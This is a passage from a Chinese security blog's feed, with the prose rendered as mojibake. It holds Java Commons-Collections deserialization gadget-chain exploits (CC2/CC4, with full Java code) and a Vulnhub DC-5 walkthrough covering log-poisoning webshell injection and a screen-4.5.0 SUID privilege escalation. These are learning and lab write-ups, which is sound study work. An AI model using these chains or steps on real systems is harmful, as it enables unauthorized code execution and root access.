class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">        priorityQueue.add(templates);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, invokerTransformer);  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952596.png" alt="image-20230706195209452"></p><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p>ËøôÊ¨°ÊµÅÁ®ãÂõæËøòÊòØÁõ¥Êé•Âú®ÂâçÈù¢ÁöÑÂü∫Á°Ä‰∏äÊîπÁöÑÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061952237.png" alt="image-20230706195223181"></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-5</title>
      <link href="/2023/07/Vulnhub-DC-5/"/>
      <url>/2023/07/Vulnhub-DC-5/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-5.zip">https://download.vulnhub.com/dc/DC-5.zip</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>Â∏∏ËßÑÊìç‰ΩúÂ≠òÊ¥ªIPÊâ´Êèè<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061520919.png" alt="image-20230706151759773"><br>Á´ØÂè£ÂºÄÊîæÊâ´Êèè<code>nmap -A -p- 192.168.75.138</code>ÂæóÂÖ®Á´ØÂè£Êâ´Êèè‰∏çÁÑ∂ÂêéÈù¢ÈÇ£‰∏™Êâ´‰∏çÂá∫Êù•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521447.png" alt="image-20230706152121358"><br>È°µÈù¢ÁöÑÊ°ÜÊ°ÜÊµã‰∫Ü‰∏Ä‰∏ãÊ≤°Âï•‰∏úË•øÔºåÂú®ÊàëÊù•ÂõûË∑≥ËΩ¨ÁöÑÊó∂ÂÄôÁúãÂà∞Â¶Ç‰∏ã‰ΩçÁΩÆ‰ºöÂèëÁîüÂèòÂåñ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521465.png" alt="image-20230706152129436"><br>ÁåúÊµãÂèØËÉΩÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´ÔºådirsearchÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521542.png" alt="image-20230706152137505"><br>ËÆøÈóÆfooter.phpÂà∑Êñ∞ÂèëÁé∞Âπ¥‰ªΩÂèòÂåñÔºå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061521344.png" alt="image-20230706152148309"><br>ËÄåthankyou.phpÈ°µÈù¢Âà∑Êñ∞‰πüÂ≠òÂú®ÂèòÂåñÔºåÁ°ÆËÆ§ËøôÈáåÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´fuzz‰∏Ä‰∏ãÂèÇÊï∞Êú¨Êù•ÊÉ≥Áî®wfuzzÊù•fuzzÂèÇÊï∞ÁöÑ‰ΩÜÊòØ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà‰∏ÄÁõ¥404Êó†Â•àÂè™ËÉΩÊéèÂá∫ÊàëÁèçËóèÂ§öÂπ¥ÁöÑÂ≠óÂÖ∏‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523186.png" alt="image-20230706152313122"><br>ÂæóÂà∞ÂèÇÊï∞‰∏∫fileÔºå‰ªéÊèí‰ª∂‰∏≠ÂæóÂà∞ÊúçÂä°‰∏∫nginxÈÇ£‰πàÂèØ‰ª•Â∞ùËØïÂà©Áî®Êó•ÂøóÂÜôÈ©¨ÔºåËÆøÈóÆÊó•Âøó‰∏ªË¶ÅËÆ∞ÂΩïÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±Ç„ÄÇÂÆ¢Êà∑Á´ØÂêëNginxÊúçÂä°Âô®ÂèëËµ∑ÁöÑÊØè‰∏ÄÊ¨°ËØ∑Ê±ÇÈÉΩËÆ∞ÂΩïÂú®ËøôÈáå„ÄÇÂÆ¢Êà∑Á´ØIPÔºåÊµèËßàÂô®‰ø°ÊÅØÔºårefererÔºåËØ∑Ê±ÇÂ§ÑÁêÜÊó∂Èó¥ÔºåËØ∑Ê±ÇURLÁ≠âÈÉΩÂèØ‰ª•Âú®ËÆøÈóÆÊó•Âøó‰∏≠ÂæóÂà∞„ÄÇ<br>ÈÄöËøáfuzzÂæóÂà∞Êó•ÂøóË∑ØÂæÑÂ¶Ç‰∏ãÔºåÂΩìÁÑ∂ËøôÈáåÊòØÈªòËÆ§ÁöÑÁõ¥Êé•ËÆøÈóÆÂ∞±Ë°å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><h2 id="ÈÄöËøánginxÊó•ÂøóÂÜôÂÖ•webshell"><a href="#ÈÄöËøánginxÊó•ÂøóÂÜôÂÖ•webshell" class="headerlink" title="ÈÄöËøánginxÊó•ÂøóÂÜôÂÖ•webshell"></a>ÈÄöËøánginxÊó•ÂøóÂÜôÂÖ•webshell</h2><p>ÁÑ∂ÂêéÂ∞ùËØïÂÜôÂÖ•ÁÇπ‰∏úË•ø<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061549253.png" alt="image-20230706152333451">ÂèëÁé∞ÂÜôÂÖ•ÊàêÂäü<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061523970.png" alt="image-20230706152340900"></p><p>ÈÇ£‰πàÁõ¥Êé•ÂÜôÈ©¨ËøõÂéªÔºåËøôÈáå‰∏ÄÂºÄÂßãÊ≠ªÊ¥ªÂÜô‰∏ç‰∏äÂêéÈù¢ÈáçÊñ∞‰∏ãËΩΩ‰∫Ü‰∏Ä‰∏ãÈù∂Êú∫ÊâçÂÜô‰∏äÂ•áÂ•áÊÄ™ÊÄ™<img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061552343.png" alt="image-20230706155159016"></p><p>ËøôÊ†∑Â∞±ÂÜôÂÖ•ÊàêÂäü‰∫ÜÔºåÁÑ∂ÂêéÂÜçÂéªÂåÖÂê´‰∏Ä‰∏ãÊó•ÂøóÂç≥ÂèØÁúãÂà∞Ôºå‰∏ãÂõæÁ¨¨‰∏Ä‰∏™ÊòØÊàëÁõ¥Êé•Áî®hackbarÂèëÂåÖÂÜôÁöÑÔºåÂèØ‰ª•ÁúãÂà∞Âú®Êó•Âøó‰∏äÁõ¥Êé•ÊòæÁ§∫‰∫ÜÈ©¨Ôºå‰ΩÜÊòØÈÇ£‰∏™Ë¢´ËΩ¨‰πâ‰∫ÜÂÆûÊµãËøû‰∏ç‰∏äÔºåÂêéÈù¢‰∏Ä‰∏™ÊòØÊàëÁî®bpÂèëÂåÖÂÜôÁöÑËôΩÁÑ∂Áúã‰∏çÂà∞È©¨‰ΩÜÊòØÂÆûÈôÖ‰∏äÂ∑≤ÁªèÂÜôËøõÂéª‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524113.png" alt="image-20230706152416061"><br>ÁÑ∂ÂêéËöÅÂâëËøûÊé•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524932.png" alt="image-20230706152425898"><br>‰∏∫www-dataÊùÉÈôêÔºåÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ÊòØÊèêÊùÉ‰∫Ü</p><h2 id="screenÊèêÊùÉ"><a href="#screenÊèêÊùÉ" class="headerlink" title="screenÊèêÊùÉ"></a>screenÊèêÊùÉ</h2><p>ÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§Êü•ÁúãÂì™‰∫õÂëΩ‰ª§ÂÖ∑ÊúâsuidÊùÉÈôê</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524909.png" alt="image-20230706152437869"><br>Êúâ‰∏™eximÂú®dc-4‰∏≠‰∏çÂ∞±ÊòØÁî®Ëøô‰∏™ÊèêÊùÉÁöÑÂêó‰∏çÁü•ÈÅìËøôÈáåÂèØ‰∏çÂèØ‰ª•Ôºå‰∏çËøáËøôÈáåÂÖà‰∏çÁÆ°ÂæÖ‰ºöÂÑøÂÜçÁúãÔºåËøôÈáåÂÖàÁúã<code>screen-4.5.0</code>Âú®msf‰∏äÊêú‰∏Ä‰∏ãÁõ∏ÂÖ≥ÊºèÊ¥ûÔºåÊâæÂà∞‰πãÂêéÊâßË°åÂ¶Ç‰∏ãÊìç‰ΩúÊääexpÊã∑‰∏ãÊù•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061524427.png" alt="image-20230706152458317"><br>ÁÑ∂ÂêéÊ†πÊçÆexpÊèêÁ§∫Â∞ÜÂ¶Ç‰∏ã‰ª£Á†ÅÂçïÁã¨‰øùÂ≠ò‰∏∫<code>libhax.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525991.png" alt="image-20230706152507960"><br>ÁÑ∂ÂêégccÁºñËØëÂÆÉÂæóÂà∞soÊñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so  libhax.c</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂÜçÂ∞ÜÂ¶Ç‰∏ã‰ª£Á†Å‰øùÂ≠ò‰∏∫<code>rootshell.c</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525278.png"><br>ÁÑ∂Âêé‰πüÊòØgccÁºñËØëÂæóÂà∞rootshellÔºåËøôÈáå‰∏ÄÂÆöË¶ÅÊ≥®ÊÑèËá™Â∑±ÊîªÂáªÊú∫ÁöÑglibcÁöÑÁâàÊú¨‰∏çÁÑ∂ÂêéÈù¢‰ºöÊä•Èîô</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞ÜÂâ©‰∏ãÁöÑÂëΩ‰ª§ÈÉ®ÂàÜ‰øùÂ≠ò‰∏∫<code>dc5.sh</code>Â§¥ÈÉ®Âä†‰∏ä#!&#x2F;bin&#x2F;bashÈò≤Ê≠¢‰π±Á†Å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525981.png" alt="image-20230706152533941"><br>ÁÑ∂ÂêéÁî®vimÁºñËæëÂÆÉÔºå‰ΩøÁî®<code>:set ff=unix</code>Êù•‰øùÂ≠ò<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061525014.png" alt="image-20230706152547920"><br>ÁÑ∂ÂêéÊääËøô‰∏â‰∏™Êñá‰ª∂‰∏ä‰º†Âà∞Èù∂Êú∫ÁöÑtmpÁõÆÂΩï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526339.png" alt="image-20230706152608276"><br>Áªô<code>dc5.sh</code>ËµãÊâßË°åÊùÉÈôêÂêéÊâßË°åÔºåËøôÈáåÁî±‰∫éÊàëÂá∫‰∫ÜÈóÆÈ¢òÊâÄ‰ª•ÊúÄÂêéÂºπ‰∫ÜshellÊâßË°åÁöÑ<code>run.sh</code>ÂΩìÁÑ∂ËøôÈáåÊñá‰ª∂Âêç‰∏çÈáçË¶ÅÈöè‰æøÂ∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061526044.png" alt="image-20230706152624999"><br>ËøôÈáåÊä•Èîô‰∫ÜÔºå‰∏ÄÁõ¥Ê≤°ÊúâÁúãÊä•ÈîôÁöÑ‰π†ÊÉØÊâæ‰∫ÜÂçäÂ§©ÂçöÂÆ¢‰ºº‰πéÈÉΩÊ≤°Â∏àÂÇÖÈÅáÂà∞ËøáËøô‰∏™ÈóÆÈ¢òÔºåÂÖ∂ÂÆûËøôÈáåÂ∞±ÊòØglibcÁâàÊú¨ÈóÆÈ¢òÔºåÊàëkaliÈªòËÆ§‰ΩøÁî®‰∫Ü2.34Ëøô‰∏™ÁâàÊú¨ÔºåËÄåÈù∂Êú∫Ê†πÊú¨Ê≤°ÊúâËøô‰∏™ÁâàÊú¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528312.png" alt="image-20230706152807259"><br>ÊâÄ‰ª•‰∏ÄÁõ¥Êä•ÈîôÔºåÂêéÈù¢Êää<code>rootshell.c</code>ÊîæÂà∞Èù∂Êú∫‰∏äÈù¢ÁºñËØëÁÑ∂ÂêéÂÜçÊâßË°årun.shÊàêÂäüÊèêÊùÉÔºåÈÅáÂà∞ÈóÆÈ¢òËøòÊòØË¶ÅÂÖàÂàÜÊûê‰∏Ä‰∏ãÊä•ÈîôÂïä<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061528826.png" alt="image-20230706152818770"><br>‰∏äÈù¢ÁöÑeximÊàëËØï‰∫Ü<code>4.84.3</code>Ëøô‰∏™ÁâàÊú¨‰ΩÜÊòØÂ§±Ë¥•‰∫ÜÔºåÈù∂Êú∫ÊòØ<code>4.84.2</code>‰ΩÜÊòØmsfÊ≤°ÊúâexpÊúÄÁªàÂ§±Ë¥•‰∫Ü</p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ4</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE4/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE4/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>ÂÖ∂ÂÆÉÁöÑÂíåÂâçÈù¢‰∏ÄÊ†∑ÔºåÂè™‰∏çËøáCommons-Collections ‰æùËµñÂèò‰∏∫‰∫Ü4.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="ÈìæÂ≠êÂàÜÊûê"><a href="#ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="ÈìæÂ≠êÂàÜÊûê"></a>ÈìæÂ≠êÂàÜÊûê</h2><p>Âú®CC4‰∏äÂ∞æÈÉ®ÁöÑÂëΩ‰ª§ÊâßË°åÊ≤°Êúâ‰ªÄ‰πàÂèòÂåñÂèçÂ∞ÑÊàñËÄÖÂä®ÊÄÅÂä†ËΩΩÂ≠óËäÇÁ†ÅÔºåÊîπÂèòÁöÑÊòØCC4ÂéªÊéâ‰∫Ü InvokerTransformer ÁöÑ Serializable ÁªßÊâøÔºåÈÇ£‰πàInvokerTransformerÁî®‰∏ç‰∫Ü‰∫ÜÂ∞±Ë¶ÅÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>transform()</code>Èöè‰æøÁî®‰∏™Á±ªÁÑ∂Âêéfind usages <code>transform()</code>ËøôÈáåÊúÄÁªàÊâæÁöÑÊòØ<code>TransformingComparator</code> Á±ª‰∏≠ÁöÑ<code>compare</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>transform()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247478.png" alt="image-20230705124539354"><br><code>compare</code>ÊñπÊ≥ïÂú®Java‰∏≠‰πüÊòØÂ∏∏Áî®ÁöÑÔºåÁî®‰∫é‰∏§‰∏™ÂØπË±°ÁöÑÂ§ßÂ∞èÊØîËæÉÔºåÁªßÁª≠ÂæÄÂâçÊâæÁúãË∞ÅË∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ïÔºå‰ΩÜÊòØËøôÈáåÁõ¥Êé•find usagesÊâæ‰∏çÂà∞ÔºåÁúãÁªÑÈïøËßÜÈ¢ëËØ¥ÂæóÂØπÂºÄÂèëÊØîËæÉÁÜüÊÇâÔºåÂºÄÂèëÊàëÊòØ‰∏ÄÁÇπ‰∏çÁÜüÂïäÔºåÈöæÂèóÔºåÊúÄÂêéÁõ¥Êé•ÁªôÂá∫‰∫Ü<code>PriorityQueue</code>Á±ªÁî®‰∫é‰ºòÂÖàÈòüÂàóÁöÑÊìç‰ΩúÔºåÂú®Ëøô‰∏™Á±ª‰∏≠Ë∞ÉÁî®‰∫Ü<code>compare</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247664.png" alt="image-20230705124731533"><br>ÁÑ∂ÂêéÁªßÁª≠ÂæÄ‰∏äÊâæÊâæÂà∞‰∫ÜËøô‰∏™Á±ª‰∏≠ÁöÑreadObjectÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247635.png"><br>ÈÇ£‰πàÂÖ∂ÂÆûÂà∞ËøôÈáåÂèØ‰ª•ÁúãÂà∞ÂÖ•Âè£Á±ªÂ∞±Âèò‰∫ÜÔºåÈìæÂ≠êÂà∞ËøôÈáåÂ∞±ÁªìÊùü‰∫ÜÔºåÊé•‰∏ãÊù•ÁºñÂÜôEXP</p><h2 id="EXPÁºñÂÜô"><a href="#EXPÁºñÂÜô" class="headerlink" title="EXPÁºñÂÜô"></a>EXPÁºñÂÜô</h2><p>ÂÖàÊääÂêéÈù¢ÁöÑÂä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°åÂÜôÂá∫Êù•ÔºåÂíåCC3‰∏ÄÊ†∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//Âä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°å  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ÊµãËØïÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051247890.png" alt="image-20230705124756650"><br>ÁÑ∂ÂêéÂ∞±ÊòØÊîæÂºÉ<code>InvokerTransformer</code>ËΩ¨Áî®<code>TransformingComparator</code> Á±ªÁöÑ <code>compare()</code>ÊñπÊ≥ïÔºåÂÜçÁî®PriorityQueueÁ±ªÂΩìÂÖ•Âè£ÂéªË∞ÉÁî®ÔºåÁÑ∂ÂêéÂØπPriorityQueueÂ∫èÂàóÂåñÔºå‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span 